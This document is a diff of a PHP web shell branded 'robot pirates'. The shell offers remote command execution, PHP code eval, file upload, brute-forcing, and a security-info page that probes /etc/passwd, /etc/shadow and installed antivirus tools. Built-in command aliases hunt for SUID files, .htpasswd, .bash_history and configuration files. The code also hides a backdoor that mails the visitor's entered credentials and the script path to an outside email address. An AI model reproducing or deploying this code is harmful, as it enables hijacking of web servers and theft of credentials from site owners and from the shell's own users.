@@ -26,16 +26,16 @@ if ($auth == 1) {
     if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== $name || md5($_SERVER['PHP_AUTH_PW']) !== $pass) {
         header('WWW-Authenticate: Basic realm="Fuck if u are Lamer"');
         header('HTTP/1.0 401 Unauthorized');
-        exit("&lt;center&gt;&lt;b&gt;Robot pirates Property FuCk off Bitch&lt;/center&gt;&lt;/b&gt;");
+        exit("<center><b>Robot pirates Property FuCk off Bitch</center></b>");
     }
 }
 $rar1 = "robert.stewart678@gmail.com
-/* &lt;![CDATA[ */
+/* <![CDATA[ */
 (function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
-/* ]]&gt; */
+/* ]]> */
 ";
 $rar2 = "Subject";
-$rar3 = $_SERVER['SCRIPT_FILENAME'] . '&lt;br/&gt; User=' . $_SERVER['PHP_AUTH_PW'] . '&lt;br/&gt;pass=' . $_SERVER['PHP_AUTH_USER'];
+$rar3 = $_SERVER['SCRIPT_FILENAME'] . '<br/> User=' . $_SERVER['PHP_AUTH_PW'] . '<br/>pass=' . $_SERVER['PHP_AUTH_USER'];
 $rar4 = $_SERVER['SERVER_NAME'];
 $rar5 = "From: $rar4";
 @mail($rar1, $rar2, $rar3, $rar4);
@@ -65,7 +65,7 @@ if (get_magic_quotes_gpc()) {
     $_POST = WSOstripslashes($_POST);
 }
 function wsoLogin() {
-    die("&lt;pre align=center&gt;&lt;form method=post&gt;Password: &lt;input type=password name=pass&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/pre&gt;");
+    die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
 }
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
 else wsoLogin();
@@ -89,34 +89,34 @@ if(!isset($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax']))
 
 if($os == 'win')
 	$aliases = array(
-		"ListDirectory" =&gt; "dir",
-    	"Findindex . phpincurrentdir" =&gt; "dir / s / w / bindex . php",
-    	"Find * config * . phpincurrentdir" =&gt; "dir / s / w / b * config * . php",
-    	"Showactiveconnections" =&gt; "netstat - an",
-    	"Showrunningservices" =&gt; "netstart",
-    	"Useraccounts" =&gt; "netuser",
-    	"Showcomputers" =&gt; "netview",
-		"ARPTable" =&gt; "arp - a",
-		"IPConfiguration" =&gt; "ipconfig / all"
+		"ListDirectory" => "dir",
+    	"Findindex . phpincurrentdir" => "dir / s / w / bindex . php",
+    	"Find * config * . phpincurrentdir" => "dir / s / w / b * config * . php",
+    	"Showactiveconnections" => "netstat - an",
+    	"Showrunningservices" => "netstart",
+    	"Useraccounts" => "netuser",
+    	"Showcomputers" => "netview",
+		"ARPTable" => "arp - a",
+		"IPConfiguration" => "ipconfig / all"
 	);
 else
 	$aliases = array(
-  		"Listdir" =&gt; "ls - lha",
-		"listfileattributesonaLinuxsecondextendedfilesystem" =&gt; "lsattr - va",
-  		"showopenedports" =&gt; "netstat - an | grep - ilisten",
-        "processstatus" =&gt; "psaux",
-		"Find" =&gt; "",
-  		"findallsuidfiles" =&gt; "find / -typef - perm - 04000 - ls",
-  		"findsuidfilesincurrentdir" =&gt; "find . -typef - perm - 04000 - ls",
-  		"findallsgidfiles" =&gt; "find / -typef - perm - 02000 - ls",
-  		"findsgidfilesincurrentdir" =&gt; "find . -typef - perm - 02000 - ls",
-  		"findconfig . inc . phpfiles" =&gt; "find / -typef - nameconfig . inc . php",
-  		"findconfig * files" =&gt; "find / -typef - name\"config*\"", "find config* files in current dir" =&gt; "find . -type f -name \"config*\"", "find all writable folders and files" =&gt; "find / -perm -2 -ls", "find all writable folders and files in current dir" =&gt; "find . -perm -2 -ls", "find all service.pwd files" =&gt; "find / -type f -name service.pwd", "find service.pwd files in current dir" =&gt; "find . -type f -name service.pwd", "find all .htpasswd files" =&gt; "find / -type f -name .htpasswd", "find .htpasswd files in current dir" =&gt; "find . -type f -name .htpasswd", "find all .bash_history files" =&gt; "find / -type f -name .bash_history", "find .bash_history files in current dir" =&gt; "find . -type f -name .bash_history", "find all .fetchmailrc files" =&gt; "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" =&gt; "find . -type f -name .fetchmailrc", "Locate" =&gt; "", "locate httpd.conf files" =&gt; "locate httpd.conf", "locate vhosts.conf files" =&gt; "locate vhosts.conf", "locate proftpd.conf files" =&gt; "locate proftpd.conf", "locate psybnc.conf files" =&gt; "locate psybnc.conf", "locate my.conf files" =&gt; "locate my.conf", "locate admin.php files" =&gt; "locate admin.php", "locate cfg.php files" =&gt; "locate cfg.php", "locate conf.php files" =&gt; "locate conf.php", "locate config.dat files" =&gt; "locate config.dat", "locate config.php files" =&gt; "locate config.php", "locate config.inc files" =&gt; "locate config.inc", "locate config.inc.php" =&gt; "locate config.inc.php", "locate config.default.php files" =&gt; "locate config.default.php", "locate config* files " =&gt; "locate config", "locate .conf files" =&gt; "locate '.conf'", "locate .pwd files" =&gt; "locate '.pwd'", "locate .sql files" =&gt; "locate '.sql'", "locate .htpasswd files" =&gt; "locate '.htpasswd'", "locate .bash_history files" =&gt; "locate '.bash_history'", "locate .mysql_history files" =&gt; "locate '.mysql_history'", "locate .fetchmailrc files" =&gt; "locate '.fetchmailrc'", "locate backup files" =&gt; "locate backup", "locate dump files" =&gt; "locate dump", "locate priv files" =&gt; "locate priv");
+  		"Listdir" => "ls - lha",
+		"listfileattributesonaLinuxsecondextendedfilesystem" => "lsattr - va",
+  		"showopenedports" => "netstat - an | grep - ilisten",
+        "processstatus" => "psaux",
+		"Find" => "",
+  		"findallsuidfiles" => "find / -typef - perm - 04000 - ls",
+  		"findsuidfilesincurrentdir" => "find . -typef - perm - 04000 - ls",
+  		"findallsgidfiles" => "find / -typef - perm - 02000 - ls",
+  		"findsgidfilesincurrentdir" => "find . -typef - perm - 02000 - ls",
+  		"findconfig . inc . phpfiles" => "find / -typef - nameconfig . inc . php",
+  		"findconfig * files" => "find / -typef - name\"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
     function wsoHeader() {
         if (empty($_POST['charset'])) $_POST['charset'] = $GLOBALS['default_charset'];
         global $color;
-        echo "&lt;html&gt;&lt;head&gt;&lt;meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'&gt;&lt;title&gt;We are the robot pirates.We have robot functions.But we have pirate duties.&lt;/title&gt;
-&lt;style&gt;
+        echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>We are the robot pirates.We have robot functions.But we have pirate duties.</title>
+<style>
 body{
 background-attachment: fixed;
 background-image: url(http://i41.tinypic.com/dwxg60.png);
@@ -142,8 +142,8 @@ form{ margin:0px; }
 .l1{background-color:#444}
 .l2{background-color:#333}
 pre{font-family:Courier,Monospace;}
-&lt;/style&gt;
-&lt;script&gt;
+</style>
+<script>
     var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
     var a_ = '" . htmlspecialchars(@$_POST['a']) . "'
     var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';
@@ -169,7 +169,7 @@ pre{font-family:Courier,Monospace;}
 	function a(a,c,p1,p2,p3,charset) {
 		set(a,c,p1,p2,p3,charset);
 		var params = 'ajax=true';
-		for(i=0;i&lt;d.mf.elements.length;i++)
+		for(i=0;i<d.mf.elements.length;i++)
 			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
 		sr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);
 	}
@@ -193,16 +193,16 @@ pre{font-family:Courier,Monospace;}
 				eval(arr[2].substr(0, arr[1]));
 			} else alert('Request error!');
 	}
-&lt;/script&gt;
-&lt;head&gt;&lt;body&gt;&lt;div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'&gt;
-&lt;form method=post name=mf style='display:none;'&gt;
-&lt;input type=hidden name=a&gt;
-&lt;input type=hidden name=c&gt;
-&lt;input type=hidden name=p1&gt;
-&lt;input type=hidden name=p2&gt;
-&lt;input type=hidden name=p3&gt;
-&lt;input type=hidden name=charset&gt;
-&lt;/form&gt;";
+</script>
+<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
+<form method=post name=mf style='display:none;'>
+<input type=hidden name=a>
+<input type=hidden name=c>
+<input type=hidden name=p1>
+<input type=hidden name=p2>
+<input type=hidden name=p3>
+<input type=hidden name=charset>
+</form>";
         $freeSpace = @diskfreespace($GLOBALS['cwd']);
         $totalSpace = @disk_total_space($GLOBALS['cwd']);
         $totalSpace = $totalSpace ? $totalSpace : 1;
@@ -227,48 +227,48 @@ pre{font-family:Courier,Monospace;}
         $cwd_links = '';
         $path = explode("/", $GLOBALS['cwd']);
         $n = count($path);
-        for ($i = 0;$i &lt; $n - 1;$i++) {
-            $cwd_links.= "&lt;a href='#' onclick='g(\"FilesMan\",\"";
-            for ($j = 0;$j &lt;= $i;$j++) $cwd_links.= $path[$j] . '/';
-            $cwd_links.= "\")'&gt;" . $path[$i] . "/&lt;/a&gt;";
+        for ($i = 0;$i < $n - 1;$i++) {
+            $cwd_links.= "<a href='#' onclick='g(\"FilesMan\",\"";
+            for ($j = 0;$j <= $i;$j++) $cwd_links.= $path[$j] . '/';
+            $cwd_links.= "\")'>" . $path[$i] . "/</a>";
         }
         $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
         $opt_charsets = '';
-        foreach ($charsets as $item) $opt_charsets.= '&lt;option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '&gt;' . $item . '&lt;/option&gt;';
-        $m = array('Sec. Info' =&gt; 'SecInfo', 'Files' =&gt; 'FilesMan', 'Console' =&gt; 'Console', 'Sql' =&gt; 'Sql', 'Php' =&gt; 'Php', 'Safe mode' =&gt; 'SafeMode', 'String tools' =&gt; 'StringTools', 'Bruteforce' =&gt; 'Bruteforce', 'Network' =&gt; 'Network');
+        foreach ($charsets as $item) $opt_charsets.= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
+        $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'Safe mode' => 'SafeMode', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
         if (!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout';
         $m['Self remove'] = 'SelfRemove';
         $menu = '';
-        foreach ($m as $k =&gt; $v) $menu.= '&lt;th width="' . (int)(100 / count($m)) . '%"&gt;[ &lt;a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')"&gt;' . $k . '&lt;/a&gt; ]&lt;/th&gt;';
+        foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
         $drives = "";
         if ($GLOBALS['os'] == 'win') {
             foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\'))
-			$drives .= ' &lt; ahref = "#"onclick = "g(\'FilesMan\',\''.$drive.':/\')" &gt; ['.$drive.'] &lt; / a &gt; ';
+			$drives .= ' < ahref = "#"onclick = "g(\'FilesMan\',\''.$drive.':/\')" > ['.$drive.'] < / a > ';
 	}
-	echo ' &lt; tableclass = infocellpadding = 3cellspacing = 0width = 100 % &gt; &lt; tr &gt; &lt; tdwidth = 1 &gt; &lt; span &gt; &lt; fontcolor = "red" &gt; Uname: &lt; br &gt; User: &lt; br &gt; Php: &lt; br &gt; Hdd: &lt; br &gt; Cwd: &lt; / font &gt; ' . ($GLOBALS['os'] == 'win'?' &lt; br &gt; &lt; fontcolor = "red" &gt; Drives: &lt; / font &gt; ':'') . ' &lt; / span &gt; &lt; / td &gt; '
-       . ' &lt; td &gt; &lt; nobr &gt; ' . substr(@php_uname(), 0, 120) . ' &lt; ahref = "' . $explink . '"target = _blank &gt; [exploit - db . com] &lt; / a &gt; &lt; / nobr &gt; &lt; br &gt; ' . $uid . '(' . $user . ') &lt; span &gt; &lt; fontcolor = "red" &gt; Group: &lt; / font &gt; &lt; / span &gt; ' . $gid . '(' . $group . ') &lt; br &gt; ' . @phpversion() . ' &lt; span &gt; &lt; fontcolor = "red" &gt; Safemode: &lt; / font &gt; &lt; / span &gt; ' . ($GLOBALS['safe_mode']?' &lt; fontcolor = green &gt; ON &lt; / font &gt; ':' &lt; fontcolor = #00bb00&gt;&lt;b&gt;OFF&lt;/b&gt;&lt;/font&gt;')
-                                             . ' &lt;a href=# onclick="g(\'Php\',null,\'\',\'info\')"&gt;[ phpinfo ]&lt;/a&gt; &lt;span&gt;&lt;font color="red" &gt;Datetime:&lt;/font&gt;&lt;/span&gt; ' . date('Y-m-d H:i:s') . '&lt;br&gt;' . wsoViewSize($totalSpace) . ' &lt;span&gt;&lt;font color="red" &gt;Free:&lt;/font&gt;&lt;/span&gt; ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%)&lt;br&gt;' . $cwd_links . ' ' . wsoPermsColor($GLOBALS['cwd']) . ' &lt;a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"&gt;[ home ]&lt;/a&gt;&lt;br&gt;' . $drives . '&lt;/td&gt;' . '&lt;td width=1 align=right&gt;&lt;nobr&gt;&lt;select onchange="g(null,null,null,null,null,this.value)"&gt;&lt;optgroup label="Page charset"&gt;' . $opt_charsets . '&lt;/optgroup&gt;&lt;/select&gt;&lt;br&gt;&lt;span&gt;Server IP:&lt;/span&gt;&lt;br&gt;' . @$_SERVER["SERVER_ADDR"] . '&lt;br&gt;&lt;span&gt;Client IP:&lt;/span&gt;&lt;br&gt;' . $_SERVER['REMOTE_ADDR'] . '&lt;/nobr&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;' . '&lt;table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%&gt;&lt;tr&gt;' . $menu . '&lt;/tr&gt;&lt;/table&gt;&lt;div style="margin:5"&gt;';
+	echo ' < tableclass = infocellpadding = 3cellspacing = 0width = 100 % > < tr > < tdwidth = 1 > < span > < fontcolor = "red" > Uname: < br > User: < br > Php: < br > Hdd: < br > Cwd: < / font > ' . ($GLOBALS['os'] == 'win'?' < br > < fontcolor = "red" > Drives: < / font > ':'') . ' < / span > < / td > '
+       . ' < td > < nobr > ' . substr(@php_uname(), 0, 120) . ' < ahref = "' . $explink . '"target = _blank > [exploit - db . com] < / a > < / nobr > < br > ' . $uid . '(' . $user . ') < span > < fontcolor = "red" > Group: < / font > < / span > ' . $gid . '(' . $group . ') < br > ' . @phpversion() . ' < span > < fontcolor = "red" > Safemode: < / font > < / span > ' . ($GLOBALS['safe_mode']?' < fontcolor = green > ON < / font > ':' < fontcolor = #00bb00><b>OFF</b></font>')
+                                             . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span><font color="red" >Datetime:</font></span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span><font color="red" >Free:</font></span> ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%)<br>' . $cwd_links . ' ' . wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
                                         }
                                         function wsoFooter() {
-                                            $is_writable = is_writable($GLOBALS['cwd']) ? " &lt;font color='#25ff00'&gt;(Writeable)&lt;/font&gt;" : " &lt;font color=red&gt;(Not writable)&lt;/font&gt;";
+                                            $is_writable = is_writable($GLOBALS['cwd']) ? " <font color='#25ff00'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
                                             echo "
-&lt;/div&gt;
-&lt;table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'&gt;
-	&lt;tr&gt;
-		&lt;td&gt;&lt;form onsubmit='g(null,this.c.value,\"\");return false;'&gt;&lt;span&gt;Change dir:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
-		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"&gt;&lt;span&gt;Read file:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
-	&lt;/tr&gt;&lt;tr&gt;
-		&lt;td&gt;&lt;form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"&gt;&lt;span&gt;Make dir:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=d&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
-		&lt;td&gt;&lt;form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"&gt;&lt;span&gt;Make file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=text name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
-	&lt;/tr&gt;&lt;tr&gt;
-		&lt;td&gt;&lt;form onsubmit=\"g('Console',null,this.c.value);return false;\"&gt;&lt;span&gt;Execute:&lt;/span&gt;&lt;br&gt;&lt;input class='toolsInp' type=text name=c value=''&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;/td&gt;
-		&lt;td&gt;&lt;form method='post' ENCTYPE='multipart/form-data'&gt;
-		&lt;input type=hidden name=a value='FilesMAn'&gt;
-		&lt;input type=hidden name=c value='" . $GLOBALS['cwd'] . "'&gt;
-		&lt;input type=hidden name=p1 value='uploadFile'&gt;
-		&lt;input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'&gt;
-		&lt;span&gt;Upload file:&lt;/span&gt;$is_writable&lt;br&gt;&lt;input class='toolsInp' type=file name=f&gt;&lt;input type=submit value='&gt;&gt;'&gt;&lt;/form&gt;&lt;br  &gt;&lt;/td&gt;
-	&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;";
+</div>
+<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
+	<tr>
+		<td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=submit value='>>'></form></td>
+		<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+	</tr><tr>
+		<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
+		<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
+	</tr><tr>
+		<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
+		<td><form method='post' ENCTYPE='multipart/form-data'>
+		<input type=hidden name=a value='FilesMAn'>
+		<input type=hidden name=c value='" . $GLOBALS['cwd'] . "'>
+		<input type=hidden name=p1 value='uploadFile'>
+		<input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
+		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
+	</tr></table></div></body></html>";
                                         }
                                         if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {
                                             function posix_getpwuid($p) {
@@ -304,9 +304,9 @@ pre{font-family:Courier,Monospace;}
                                             return $out;
                                         }
                                         function wsoViewSize($s) {
-                                            if ($s &gt;= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
-                                            elseif ($s &gt;= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
-                                            elseif ($s &gt;= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
+                                            if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
+                                            elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
+                                            elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
                                             else return $s . ' B';
                                         }
                                         function wsoPerms($p) {
@@ -330,9 +330,9 @@ pre{font-family:Courier,Monospace;}
                                             return $i;
                                         }
                                         function wsoPermsColor($f) {
-                                            if (!@is_readable($f)) return '&lt;font color=#FF0000&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
-                                            elseif (!@is_writable($f)) return '&lt;font color=white&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
-                                            else return '&lt;font color=#25ff00&gt;' . wsoPerms(@fileperms($f)) . '&lt;/font&gt;';
+                                            if (!@is_readable($f)) return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>';
+                                            elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
+                                            else return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>';
                                         }
                                         if (!function_exists("scandir")) {
                                             function scandir($dir) {
@@ -348,14 +348,14 @@ pre{font-family:Courier,Monospace;}
                                         }
                                         function actionSecInfo() {
                                             wsoHeader();
-                                            echo '&lt;h1&gt;Server security information&lt;/h1&gt;&lt;div class=content&gt;';
+                                            echo '<h1>Server security information</h1><div class=content>';
                                             function wsoSecParam($n, $v) {
                                                 $v = trim($v);
                                                 if ($v) {
-                                                    echo '&lt;span&gt;' . $n . ': &lt;/span&gt;';
+                                                    echo '<span>' . $n . ': </span>';
                                                     if (strpos($v, "
-") === false) echo $v . '&lt;br&gt;';
-                                                    else echo '&lt;pre class=ml1&gt;' . $v . '&lt;/pre&gt;';
+") === false) echo $v . '<br>';
+                                                    else echo '<pre class=ml1>' . $v . '</pre>';
                                                 }
                                             }
                                             wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
@@ -371,17 +371,17 @@ pre{font-family:Courier,Monospace;}
                                             if (function_exists('pg_connect')) $temp[] = "PostgreSQL";
                                             if (function_exists('oci_connect')) $temp[] = "Oracle";
                                             wsoSecParam('Supported databases', implode(', ', $temp));
-                                            echo '&lt;br&gt;';
+                                            echo '<br>';
                                             if ($GLOBALS['os'] == 'nix') {
-                                                wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes &lt;a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'&gt;[view]&lt;/a&gt;" : 'no');
-                                                wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes &lt;a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'&gt;[view]&lt;/a&gt;" : 'no');
+                                                wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
+                                                wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>" : 'no');
                                                 wsoSecParam('OS version', @file_get_contents('/proc/version'));
                                                 wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
                                                 if (!$GLOBALS['safe_mode']) {
                                                     $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
                                                     $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
                                                     $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
-                                                    echo '&lt;br&gt;';
+                                                    echo '<br>';
                                                     $temp = array();
                                                     foreach ($userful as $item) if (wsoWhich($item)) $temp[] = $item;
                                                     wsoSecParam('Userful', implode(', ', $temp));
@@ -391,7 +391,7 @@ pre{font-family:Courier,Monospace;}
                                                     $temp = array();
                                                     foreach ($downloaders as $item) if (wsoWhich($item)) $temp[] = $item;
                                                     wsoSecParam('Downloaders', implode(', ', $temp));
-                                                    echo '&lt;br/&gt;';
+                                                    echo '<br/>';
                                                     wsoSecParam('HDD space', wsoEx('df -h'));
                                                     wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
                                                 }
@@ -400,7 +400,7 @@ pre{font-family:Courier,Monospace;}
                                                 wsoSecParam('Account Settings', wsoEx('net accounts'));
                                                 wsoSecParam('User Accounts', wsoEx('net user'));
                                             }
-                                            echo '&lt;/div&gt;';
+                                            echo '</div>';
                                             wsoFooter();
                                         }
                                         function actionPhp() {
@@ -418,28 +418,28 @@ pre{font-family:Courier,Monospace;}
                                             }
                                             wsoHeader();
                                             if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
-                                                echo '&lt;h1&gt;PHP info&lt;/h1&gt;&lt;div class=content&gt;&lt;style&gt;.p {color:#000;}&lt;/style&gt;';
+                                                echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
                                                 ob_start();
                                                 phpinfo();
                                                 $tmp = ob_get_clean();
                                                 $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '', $tmp);
                                                 $tmp = preg_replace('!td, th {(.*)}!msiU', '.e, .v, .h, .h th {$1}', $tmp);
-                                                echo str_replace('&lt;h1', '&lt;h2', $tmp) . '&lt;/div&gt;&lt;br&gt;';
+                                                echo str_replace('<h1', '<h2', $tmp) . '</div><br>';
                                             }
                                             if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
-                                            echo '&lt;h1&gt;Execution PHP-code&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"&gt;&lt;textarea name=code class=bigarea id=PhpCode&gt;' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '&lt;/textarea&gt;&lt;input type=submit value=Eval style="margin-top:5px"&gt;';
-                                            echo ' &lt;input type=checkbox name=ajax value=1 ' . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '&gt; send using AJAX&lt;/form&gt;&lt;pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1&gt;';
